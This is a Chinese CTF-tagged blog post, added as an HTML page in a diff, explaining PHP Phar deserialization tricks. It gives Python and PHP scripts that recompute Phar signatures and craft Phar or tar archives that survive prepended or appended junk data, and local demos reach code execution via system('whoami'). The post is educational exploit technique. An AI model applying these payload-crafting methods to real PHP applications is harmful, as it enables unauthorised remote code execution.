@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Phar反序列化及其一系列的奇技淫巧 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Phar反序列化及其一系列的奇技淫巧 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-07-08T03:36:40.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>July</span>
+            <span>8,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Phar反序列化及其一系列的奇技淫巧</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个知识点记在脑子里拖欠很久了，上班摸鱼（<br>什么是phar反序列化我就不讲了。</p>
+<h1 id="一、Phar支持的格式"><a href="#一、Phar支持的格式" class="headerlink" title="一、Phar支持的格式"></a>一、Phar支持的格式</h1><ul>
+<li>zip.zip.phar.zip</li>
+<li>tar.tar.phar.tar.pahr..tar.gz.phar.tar.bz</li>
+<li>phar.phar.phar.bz2 生成命令:bzip2 phar.phar</li>
+</ul>
+<p>了解一下就好了</p>
+<h1 id="二、绕过文件头部的脏数据（我们可以修改内容"><a href="#二、绕过文件头部的脏数据（我们可以修改内容" class="headerlink" title="二、绕过文件头部的脏数据（我们可以修改内容)"></a>二、绕过文件头部的脏数据（我们可以修改内容)</h1><p>假如遇到绕wakeup的phar反序列化，我们需要修改phar文件的内容，那我们只需要重新计算一下签名，然后把计算完签名后的phar文件的脏数据删掉，然后上传就行了。<br>重新计算签名的脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">28</span>]</span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line">sig = hashlib.sha1(text).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar_new.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(text + sig + end)</span><br></pre></td></tr></table></figure>
+<p>就是在中间加上一段哈希而已。我一向追求实践，所以我就本地搭个环境吧，每次搭phar环境一堆屁事</p>
+<h1 id="三、绕过文件头部脏数据（数据修改在服务端"><a href="#三、绕过文件头部脏数据（数据修改在服务端" class="headerlink" title="三、绕过文件头部脏数据（数据修改在服务端)"></a>三、绕过文件头部脏数据（数据修改在服务端)</h1><p>上述修改wakeup是我们可以修改文件内容，假如遇到了一种情况，就是上传文件后，他再往前面假如一段脏数据，而且数据内容我们已知，在这种情况下就不可以用上述方法了，我们需要用phardata去加上已知脏数据，重新计算签名，然后在删掉脏数据，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> flag;</span><br><span class="line"><span class="comment">//前面的脏数据</span></span><br><span class="line"><span class="variable">$dirtydata</span> = <span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$dirtydata</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//下面$dirtydata是可以自定义的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;anything&quot;</span> , <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$post_exp</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$exp</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dirtydata</span>));</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./break_phar.phar&quot;</span>,<span class="variable">$post_exp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里有一部分细节的，就是，我们不能用记事本打开手动删除，不知道为什么这样会破坏数据，我们需要用php代码去修改，上述脚本会生成一个phar，这个phar是包含了脏数据计算了一次签名，然后把脏数据删了，生成新phar，然后再触发phar反序列化的时候加上脏数据就可以正常rce了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dirty</span>=<span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"><span class="variable">$old</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar/break_phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$new</span>=<span class="variable">$dirty</span>.<span class="variable">$old</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./phar/new.phar&quot;</span>,<span class="variable">$new</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://./phar/new.phar&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688786599992-e80d9097-e9d6-4d15-a840-39a41e08e2f8.png#averageHue=%23957e64&clientId=u9867527e-2f51-4&from=paste&height=240&id=u6189340e&originHeight=300&originWidth=1091&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28905&status=done&style=none&taskId=u48859633-a6f5-4677-9ddd-7ccc05832b5&title=&width=872.8" alt="image.png"></p>
+<h1 id="四、绕过文件尾部的脏数据"><a href="#四、绕过文件尾部的脏数据" class="headerlink" title="四、绕过文件尾部的脏数据"></a>四、绕过文件尾部的脏数据</h1><p>绕过文件尾部的脏数据就不需要什么操作了，也不需要已知内容，我们可以使用tar格式自动忽略，因为tar格式有暂停解析位，在之后添加的数据都不会解析的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> flag;</span><br><span class="line"><span class="comment">//前面的脏数据</span></span><br><span class="line"><span class="variable">$dirtydata</span> = <span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/phar.tar&quot;</span>, <span class="number">0</span>, <span class="string">&quot;phartest&quot;</span>, <span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//下面$dirtydata是可以自定义的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="variable">$dirtydata</span> , <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar.tar&quot;</span>);</span><br><span class="line"><span class="variable">$post_exp</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$exp</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dirtydata</span>));</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./break_phar.phar&quot;</span>,<span class="variable">$post_exp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dirty</span>=<span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"><span class="variable">$old</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar/phar.tar&quot;</span>);</span><br><span class="line"><span class="variable">$new</span>=<span class="variable">$old</span>.<span class="variable">$dirty</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./phar/new.tar&quot;</span>,<span class="variable">$new</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://./phar/new.tar&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688787119023-6363269c-19b3-493d-9ed5-72d7e5351a0e.png#averageHue=%232d2c2c&clientId=u9867527e-2f51-4&from=paste&height=230&id=ude010917&originHeight=288&originWidth=1136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27290&status=done&style=none&taskId=u9ca8dec6-a23c-4632-a17f-573eef2ef61&title=&width=908.8" alt="image.png"></p>
+<h1 id="五、绕过前面已知脏数据同时绕过末尾未知脏数据"><a href="#五、绕过前面已知脏数据同时绕过末尾未知脏数据" class="headerlink" title="五、绕过前面已知脏数据同时绕过末尾未知脏数据"></a>五、绕过前面已知脏数据同时绕过末尾未知脏数据</h1><p>还是一样的嘛，就用tar格式就好啦。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> flag;</span><br><span class="line"><span class="variable">$dirtydata</span>=<span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/phar.tar&quot;</span>, <span class="number">0</span>, <span class="string">&quot;phartest&quot;</span>, <span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//下面$dirtydata是可以自定义的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="variable">$dirtydata</span> , <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="comment">//读取原文件，截取，删除</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar.tar&quot;</span>);</span><br><span class="line"><span class="variable">$post_exp</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$exp</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dirtydata</span>));</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./break_phar.tar&quot;</span>,<span class="variable">$post_exp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$front</span>=<span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"><span class="variable">$dirty</span>=<span class="string">&quot;dirty&quot;</span>;</span><br><span class="line"><span class="variable">$old</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./phar/break_phar.tar&quot;</span>);</span><br><span class="line"><span class="variable">$new</span>=<span class="variable">$front</span>.<span class="variable">$old</span>.<span class="variable">$dirty</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./phar/new.tar&quot;</span>,<span class="variable">$new</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://./phar/new.tar&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688787247610-8195c7f5-ec3c-46fb-895a-48951269564b.png#averageHue=%232c2c2c&clientId=u9867527e-2f51-4&from=paste&height=258&id=u6daa069e&originHeight=322&originWidth=1343&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29371&status=done&style=none&taskId=u5aad5865-391f-4950-9f90-62ec7fecc79&title=&width=1074.4" alt="image.png"></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/07/13/%E9%BC%A0%E9%BC%A0%E7%9A%84%E6%9A%91%E6%9C%9F%E5%9D%90%E7%89%A2%E6%97%A5%E8%AE%B0/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">鼠鼠的暑期坐牢日记</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/07/08/WMCTF2022%20Web%20WriteUP/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">WMCTF2022 Web WriteUP</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
